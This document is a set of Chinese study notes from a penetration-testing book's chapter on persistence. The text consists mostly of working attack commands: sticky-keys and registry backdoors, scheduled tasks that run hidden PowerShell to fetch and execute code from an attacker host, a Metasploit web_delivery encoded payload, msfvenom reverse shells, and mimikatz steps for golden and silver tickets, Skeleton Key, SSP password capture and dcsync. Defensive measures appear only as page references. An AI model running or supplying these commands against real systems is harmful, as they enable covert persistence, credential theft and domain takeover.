# 8 权限维持分析及防御
## 8.1 操作系统后门分析与防范
### 8.1.1 粘滞键后门
+ cmd
```cmd
cd windows\system32
move sethc.exe sethc.exe.bak
copy cmd.exe sethc.exe
```
+ Emprie
`usemodule lateral_movement/invoke_wmi_debugger`
### 8.1.2 注册表注入后门
+ cmd
`HKCU:software\microsoft\windows\currnetversion\run`
+ Empire
管理员登录系统时,后门就会运行
```shell
usemodule persistence/userland/registry
set listener shuteer
set regpath HKCU:software\microsoft\windows\currnetversion\run
execute
```
### 8.1.3 计划任务后门
+ cmd
`schtasks /Create /tn Updater /tr notepad.exe /sc hourly /mo 1`
+ metasploit
此处使用msf的powershell payload web delivery
```shell
use exploit/multi/script/web_delivery
msf5 exploit(multi/script/web_delivery) > set target 2
msf5 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_tcp
msf5 exploit(multi/script/web_delivery) > set lhost 192.168.1.113
msf5 exploit(multi/script/web_delivery) > set uripath /
msf5 exploit(multi/script/web_delivery) > exploit 
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[-] Handler failed to bind to 192.168.1.113:4444:-  -
[*] Started reverse TCP handler on 0.0.0.0:4444 
[*] Using URL: http://0.0.0.0:8080/
msf5 exploit(multi/script/web_delivery) > [*] Local IP: http://192.168.1.113:8080/
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB6AD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAHoALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJAB6AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADAALgAxADoAOAAwADgAMAAvAC8AUgBoAFcAMQBJAG8AdwA3AGMAWQBPACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMAAuADEAOgA4ADAAOAAwAC8AJwApACkAOwA=
```
1). 用户登录
```shell
schtasks /create /tn windowsupdate /tr "c:\windows\system32\powershell.exe -windowstyle hidden -Nologo -Noninteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.1.113:8080/'''))'" /sc onlogon /ru System
```
2). 系统启动
```shell
schtasks /create /tn windowsupdate /tr "c:\windows\system32\powershell.exe -windowstyle hidden -Nologo -Noninteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.1.113:8080/'''))'" /sc onstart system
```
3). 系统空闲
```shell
schtasks /create /tn windowsupdate /tr "c:\windows\system32\powershell.exe -windowstyle hidden -Nologo -Noninteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.1.113:8080/'''))'" /sc onidle /i 1
```
+ powersploit
使用powersploit的persistence模块
```powershell
import-module .\persistence.ps1
//如下命令,使用计划任务的方式创建后门,该后门会在计算机处于空闲状态时执行,执行成功后会生成名为"persistence.s1"的脚本,若要更改触发条件,请查看脚本说明
$elevatedoptions = new-elevatedpersistenceoption -scheduledtask -onidle
$useroptions = new-userpersistenceoption -scheduledtask -onidle
add-persistence -filepath ./shuteer.ps1 -elevatedpersistenceoption $elevatedoptions -userpersistenceoption $useroptions -verbose
```
在上述命令中"shuteer.ps1"是计划任务要执行的payload,可以执行如下命令来生成该文件
`msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.1.1 lport=443 -f psh-reflection -o shuterr.ps1`
将"persistence.s1"放在web服务器上,在目标主机中利用powershell加载并运行它,当目标处于空闲状态时,就会执行如下命令,反弹一个meterpreter
```powershell
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.1/persistence.s1');"
```
+ 在Empire中模拟计划任务后门
`usemodule persistence/elevated/schtasks`
+ meterpreter后门
persistence
https://www.cnblogs.com/mrhonest/p/12794537.html
+ Cymothoa后门(335页)
+ WMI型后门
> 需要管理员权限
> 通常使用powershell编写,无文件,无进程
	+ Empire下使用Invoke-WMI模块
	```shell
	usemodule powershell/persistence/elevated/wmi
	set ...
	run
	```
## 8.2 WEB后门分析与防范
### 8.2.1 Nishang下的WebShell
\nishang\Antak-webShell\
### 8.2.2 weevely后门
python编写针对PHP的
### 8.2.3 webacoo后门
可生成PHP的webshell
### 8.2.4 ASPX meterpreter后门
shell_renerse_tcp的payload
### 8.2.5 PHP meterpreter后门
PHP/meterpreter的payload
## 8.3 域控制器权限持久化分析与防范
### 8.3.1 DSRM域后门
+ DSRM域后门简介
> directory services restore mode 目录服务恢复模式
> DSRM帐号就是域控制器中的本地管理员帐号
> windows server 2003 不可以用
> windows server 2008 需KB961320. 2008以后的版本可直接使用
+ 修改DSRM密码的方法
> 需要在域控制器上操作
```cmd
//打开ntdsutil
NTDSUTIL
//设置DSRM的密码
set dsrm password
//在当前域控制器上回复DSRM密码
reset passwrod on server null
<PASSWORD> : 修改后的密码
q(第一次) : 退出DSRM密码设置模式
q(第二次) : 退出ntdsutil
//将DSRM密码同步为已存在的域帐号密码,是DSRM密码和制定的域用户的密码同步
sync from domain account domainusername
```
+ 实验操作
1). 使用mimikatz查看krbtgt的NTLM Hash
```
//在域控制器上打开mimikatz,查看krbtgt的NTLM Hash
privilege::debug
lsadump::lsa /patch /name:krbtgt
```
2). 使用mimikatz查看并读取SAM文件中的本地管理员(DSRM)的NTLM Hash
```
token:elevate
lsadump::sam
```
3). 将dsrm帐号和krbtgt的NTLM Hash同步
```cmd
C:\>NTDSUTIL
NTDSUTIL:SET DSRM PASSWORD
RESET DSRM Administrator Password:sync from domain account krbtgt
RESET DSRM Administrator Password:q
NTDSUTIL:q
```
4). 查看DSRM的NTLM Hash是否同步成功
`lsadump::sam`
5). 修改DSRM的登录方式
在注册表中新建`HKLM\system\currentcontrolset\control\lsa\dsrmadminlogonbehavior`项
DSRM的三种登录方式
|值|说明|
|---|----|
|0|默认值,只有当域控制器重启并进入DSRM模式时,才可以使用DSRM管理员帐号|
|1|只有当本地AD,DS服务停止时,才可以使用DSRM管理员帐号登录域控制器|
|2|在任何情况下,都可以使用DSRM管理员帐号登录域控制器|
> windows server 2000以后的版本中,对DSRM使用控制台登录域控制器进行了限制
> 要使用DSRM帐号通过网络登录域控制器,需要设置注册表值为"2"
```powershell
New-ItemProperty "HKLM\system\currentcontrolset\control\lsa\" -name "dsrmadminlogonbehavior" 0value 2 -propertyType DWORD
```
6). 使用DSRM帐号通过过网络远程登录域控制器
> 使用mimikatz进行哈希传递,在域成员机器的管理员模式下打开mimikatz
```
privilege::debug
sekurlsa::pth /domain:DC /user:Administrator /ntlm:ntlmhash
```
7). 使用mimikatz的dcsync功能远程转储krbtgt的NTLMHash
> 哈希传递之后,会弹出一个命令行,在该窗口中打开mimikatz
```
lsadump::dcsync /domain:pentest.com /dc:dc /user:krbtgt
```
+ DSRM域后门的防御措施(351页)
### 8.3.2 SSP维持域控权限
> SSP(secrrity support provider)是windows操作系统安全机制的提供者,简单的说,SSP就是一个DLL文件,主要用来实现windows的身份认证功能,例如:NTLM.KERBEROS,NEGOTIATE,SECURE CHANNEL,DIGEST,CREDENTIAL(CREDSSP)
> SSPI(secrrity support provider interface,安全支持提供的程序接口)是windows在执行认证操作时使用的API接口,sspi是ssp的API接口
> 如果获取了网络中目标机器的system权限,可以使用该方法进行持久化操作
> 原理:LSA(LOCAL SECURITY AUTHORITY)用于身份验证,lsass.exe作为windows的系统进程,用于本地安全和登录策略,在系统启动时,SSP将被加载到lsass.exe进程中,但是,加入攻击者对LSA进行了扩展,自定义了恶意DLL文件,在系统启动时将其加载到lsass.exe进程中,就能够获取lsass.exe进程中的明文密码,这样,即使用户更改密码并重新登录,攻击者依然可以获取该帐号的新密码
+ 两个实验.mimikatz
1. 使用mimikatz将伪造的SSP注入内存
> 不会在系统中留下二进制文件,但如果域控制器重启,被注入伪造的SSP将会丢失
在域控制器中以管理员权限打开mimikatz
```
privilege::debug
misc::memssp
```
注销当前用户,输入用户民个和密码后重新登录,获取明文密码,密码存储在日志文件c:\windows\system32\mimilsa.log中
2. mimikatz的mimilib(重启依旧有效)
> 将mimikatz中的mimilib.dll复制到系统的c:\windows\system32\目录下(位数相同)
> 修改`HKEY_LOCAL_MACHINE/system/currentcontrolset/control/lsa/sectrity packages`项,加载新的DLL文件
> 重启后,如果DLL加载成功,用户在登录时输入的帐号和密码明文就会被记录在c:\windows\system32\kiwissp.log中
+ SSP维持域控制器权限的防御措施(354页)
### 8.3.3 SID Hisory域后门
+ 实验操作:将administrato的SID添加到而已用户test的SID History属性中
```powershell
//查看test的SID History
import-module activedirectory
get-aduser test -properties sidhistory
```
打开一个具有域管理员权限的命令行窗口,打开mimikatz
在使用mimikatz注入SID之前,需要使用sid::patch命令修复NTDS服务,否则无法将高权限SID注入低权限用户的SIDHistory属性
mimikatz2.1版本以后,将misc::addsid模块转移到了sid::add模块下
```
privilege::debug
sid::patch
//将administrato的SID添加到test用户的SIDHistory属性中
sid:add /sam:test /new:administrator
```
再次查看test的SID History,发现设置成功了,登录test帐号,测试是否具有administrator权限
`dir \\dc\c$`
+ SID History域后门的防御措施(256页)
### 8.3.4 Golden Ticket(金票据)
> 需要伪造的域管理员用户名
> 完整的域名
> 域SID
> krbtge的NTLM Hash或者AES-256值
+ 实验环境
	+ 域控制器
	> IP:192.168.100.205
	> 域名:pentest.com
	> 用户名:administrato
	> 密码:Aa123456@
	+ 域成员机器
	> IP:192.168.100.146
	> 域名:pentest.com
	> 用户名:dm
	> 密码:a123456@
1). 导出krbtgt的BTLM Hash
`lsadump::dcsync /domain:pentest.com /user:krbtgt`
2). 获取基本信息
```cmd
//以普通权限获取域内所有用户的SID
wmic useraccount get name,sid
//获取当前用户的SID
whoami /user
//查询域管理员帐号
net group "domain admins" /domain
//查询域名
ipconfig /all
```
3). 实验操作
```
//清空票据
kerberos::purge
//生成票据文件:Administrator.kiribi
kerberos::golden /admin:Administrator /domain:pentest.com /sid:dm账户的SID /krbtgt:ntlmhash /ticket:Administrator.kiribi
//传递票据并注入内存
kerberos::ptt Administrator.kiribi
//检索当前会话中的票据
kerberos::tgt
//退出mimikatz.重新验证权限
exit
dir \\dc\c$
//使用vmiexec.vbs验证
cscript vmiexec.vbs /shell dc
//也可以使用krbtgt的AES-256值生成票据,也可以伪造用户
kerberos::golden /admin:Administrator /domain:pentest.com /sid:dm账户的SID /ase256:AES-256值 /ticket:Administrator.kiribi
```
4). golded Ticket攻击的防御措施(362页)
### 8.3.5 Silver Ticket(银票据)
> 域名
> 域SID
> 目标服务器的FQDN
> 可利用的服务
> 服务帐号的NTLM Hash
> 需要伪造的用户名
+ 实验:使用SilverTicket伪造GIFS服务权限
> GIFS服务通常用于windows主机之间的文件共享
```
//在域控制器上使用mimikatz获取服务帐号的NTLM Hash,使用log参数以便复制散列值
mimikatz log "privilege::debug" "sekurlsa::logonpasswords"
//清空当前系统中的票据 cmd命令
klist purge
//使用mimikatz生成伪造的silver ticket(可以在非域控机器上)
kerberos::golden /domain:pentest.com /sid:dm帐号的SID /target:dc.pentest.com /service:cifs /rc4:服务帐号的NTLMHash /user:dm /ptt
//验证权限
dir \\dc\c$
```
+ 实验:使用SilverTicket伪造LADP服务权限
```
//测试以当前权限是否可以使用dcsync与域控制器进行同步(此处失败)
lsadump::dcsync /dc:dc.pentest.com /domain:pentest.com /user:krbtgt
//在域控制器中使用mimikatz获取服务帐号的ntlm hash
mimikatz log "privilege::debug" "sekurlsa::logonpasswords"
//清空当前系统中的票据 cmd命令
klist purge
//使用mimikatz生成伪造的silver ticket,在之前(第一步)中不能使用dcsync从域控制器获取krbtgt密码散列值的机器中
kerberos::golden /domain:pentest.com /sid:dm帐号的SID /target:dc.pentest.com /service:LDAP /rc4:服务帐号的NTLMHash /user:dm /ptt
//现在可以使用dcsync在域控制器中查询krbtgt的密码散列值了
lsadump::dcsync /dc:dc.pentest.com /domain:pentest.com /user:krbtgt
```
+ SilverTicket还可以伪造其他服务
> 如:创建和修改计划任务,使用wmi对远程主机执行命令,使用powershell对远程主机进行管理等
|service type|service silver tickets|
|----|----|
|WMI|HOST<br>RPCSS|
|POWERSHELL REMOTING|HOST<BR>HTTP<BR>Depending on OS version may also need:<br>WSMAN<BR>RPCSS|
|WinRM|HOST<br>HTTP|
|Scheduled Tasks|HOST|
|Windows file share(CIFS)|CIFS|
|LDAP operations including mimikatz DCSync|LDAP|
|windows remote server administration tools|RPCSS<BR>LDAP<BR>CIFS|
+ Silver Ticket攻击的防御措施(367页)
### 8.3.6 Skeleton Key(万能密码)
+ 实验:将Skeleton Key注入域控制器的lsass.exe进程
实验环境:
	远程系统
	> 域名:tentest.com
	域控制器
	> 主机名:DC
	> IP:192.168.100.205
	> 用户名:administrato
	> 密码:a123456#
	域成员服务器
	> 主机名:conputer1
	> IP:192.168.100.200
	> 用户名:dm
	> 密码:a123456@
1). 在mimikatz中使用Skeleton Key
```
//尝试以当前用户身份列出域控制器c盘共享目录
dir \\dc\c$			//失败
//在域控制器中以管理员权限打开mimikatz,将Skeleton Key注入域控制器的lsass.exe进程
privilege::debug
misc::skeleton
//注入成功,会在域内的所有帐号中添加一个Skeleton Key,其密码默认为"mimikatz"
//验证
net use \\dc\ipc$ "mimikatz" /user:pentest\administrator
```
2). 在Empire中使用Skeleton Key
`usemodule persistence/misc/skeleton_kay*`
+ Skeleton Key攻击的防御措施(369页)
### 8.3.7 Hook PasswordChangeNptify
> Hook PasswordChangeNptify的作用是当用户修改密码后在系统中进行同步,攻击者可以利用该功能获取用户修改密码时输入的密码明文
> 在修改密码时,用户输入新密码后,LSA会调用passwordfileter来检查密码是否符合复杂度要求,如果密码符合复杂度要求,LSA会调用PasswordChangeNptify在系统中同步密码
+ 实验操作
输入以下命令,使用invoke-ReflectivePEInjection.ps1将Hook PasswordChange.dll注入内存
```
//管理员权限的powershell
Import-module .\invoke-ReflectivePEInjection.ps1
invoke-ReflectivePEInjection -PEPath Hook PasswordChange.dll -procname lsass
```
若用户修改密码,会在c:\windows\temp\password.txt中存储明文信息
+ Hook PasswordChangeNptify的防御措施(371页)
## 8.4 Nishang下的脚本后门分析与防范
+ HTTP-Backdoor脚本
> 在目标主机上下载和执行powershell脚本.接收来自第三方网站的指令,在内存中执行powershell脚本
```powershell
HTTP-Backdoor -checkurl http://www.shigophilotk/index.php?id=2 -payloadurl http://www.shigophilotk/index.php?id=3 -magicstring start123 -stopstring stopthis
```
|参数|说明|
|----|----|
|-checkurl|如果该地址存在,magicstring中的值就会执行payload,下载并运行攻击者的脚本|
|-payloadurl|给出需要下载的powershell脚本地址|
|-stopstring|判断是否存在checkurl返回的字符串,如果存在则停止执行|
+ Add-ScrnSaveBackdoor脚本
> 利用windows屏幕保护程序来安插一个隐藏的后门
```powershell
//执行payload
Add-ScrnSaveBackdoor -payload "powershell代码"
//在powershell中执行一个HTTP-Backdoor脚本
Add-ScrnSaveBackdoor -payloadURL http://www.shigophilotk/powerpreter.psm1 -Arguments HTTP-Backdoor http://www.shigophilotk/index.php?id=2 http://www.shigophilotk/index.php?id=3 start123 -stopstring 
//
Add-ScrnSaveBackdoor -payloadURL http://www.shigophilotk/execcode.ps1
```
|参数|说明|
|----|----|
|-Arguments|指定需要执行的函数及相关参数|
|-payloadurl|给出需要下载的powershell脚本地址|
+ Execute-OnTime
> 用于在目标主机上指定powershell脚本的执行时间,与HTTP-Backdoor脚本的使用方法相似,只不过增加了定时功能
```powershell
Execute-OnTime  -payloadurl http://www.shigophilotk/index.php?id=3 -Arguments Get-information -Time hh:mm -checkurl http://www.shigophilotk/index.php?id=2 -stopstring stoppayload
```
|参数|说明|
|----|----|
|-checkurl|如果该地址存在,magicstring中的值就会执行payload,下载并运行攻击者的脚本|
|-payloadurl|给出需要下载的powershell脚本地址|
|-Arguments|指定要执行的函数名|
|-Time|设置脚本在执行的时间,如:"-Time 23:59"|
|-CheckUrl|检测一个制定的URL里是否存在stopstring给出的字符串,如果存在就停止执行|
+ Invoke-ADSBackdoor
> 可以在NTFS数据流中留下一个永久性的后门
> 只能通过"dir /a /r"命令才能看到写入的文件
```powershell
//向ADS注入代码并以普通用户权限运行
Invoke-ADSBackdoor -payloadURL http://www.shigophilotk/execcode.ps1
```